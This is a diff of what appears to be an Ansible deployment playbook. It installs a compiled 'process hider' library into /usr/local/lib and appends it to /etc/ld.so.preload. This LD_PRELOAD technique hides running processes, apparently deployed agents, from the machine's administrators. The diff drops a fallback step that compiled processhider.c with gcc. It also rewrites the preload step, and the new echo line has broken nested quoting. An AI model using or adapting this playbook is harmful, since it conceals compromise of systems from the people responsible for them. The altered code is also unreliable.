@@ -117,16 +117,12 @@
         chdir: "{{ deploy_dir }}"
       ignore_errors: yes
 
-    - name: Compile process hider manually (fallback)
-      shell: gcc -Wall -fPIC -shared -o process.so processhider.c -ldl
-      args:
-        chdir: "{{ deploy_dir }}"
-      ignore_errors: yes
-
     - name: Move compiled .so and update /etc/ld.so.preload
       shell: |
-        mv {{ deploy_dir }}/process.so /usr/local/lib/ 2>/dev/null || true
-        grep -qxF "/usr/local/lib/process.so" /etc/ld.so.preload || echo "/usr/local/lib/process.so" >> /etc/ld.so.preload
+        mv {{ deploy_dir }}/process.so /usr/local/lib/ 2>/dev/null
+    
+    - name: echo to preload
+      shell: "echo "/usr/local/lib/process.so" >> /etc/ld.so.preload"
 
     ###################################################################
     # Clean up only source files, not the deployed agents
